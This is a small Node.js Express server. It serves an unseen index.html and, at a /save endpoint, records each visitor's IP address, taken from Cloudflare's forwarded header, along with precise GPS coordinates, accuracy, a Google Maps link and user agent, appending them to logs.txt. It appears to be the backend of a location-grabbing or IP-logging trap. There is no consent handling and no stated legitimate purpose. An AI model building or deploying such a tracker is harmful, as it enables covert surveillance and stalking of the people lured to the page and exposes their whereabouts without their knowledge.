const express = require("express");
const fs = require("fs");

const app = express();

app.use(express.json());

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

app.post("/save", async (req, res) => {
  try {
    const ip =
      req.headers["cf-connecting-ip"] ||
      req.socket.remoteAddress;

    const lat = req.body.latitude;
    const lon = req.body.longitude;
    const maps = `https://maps.google.com/?q=${lat},${lon}`;

    const log = `
==============================
TIME : ${new Date().toISOString()}
IP   : ${ip}
LAT  : ${lat}
LON  : ${lon}
ACC  : ${req.body.accuracy} meters
MAP  : ${maps}
UA   : ${req.body.userAgent}
==============================

`;

    fs.appendFileSync("logs.txt", log);
    console.log(log);

    res.sendStatus(200);

  } catch (err) {
    console.log("ERROR:", err);
    res.sendStatus(500);
  }
});

app.listen(3000, "0.0.0.0", () => {
  console.log("Server running on port 3000");
});
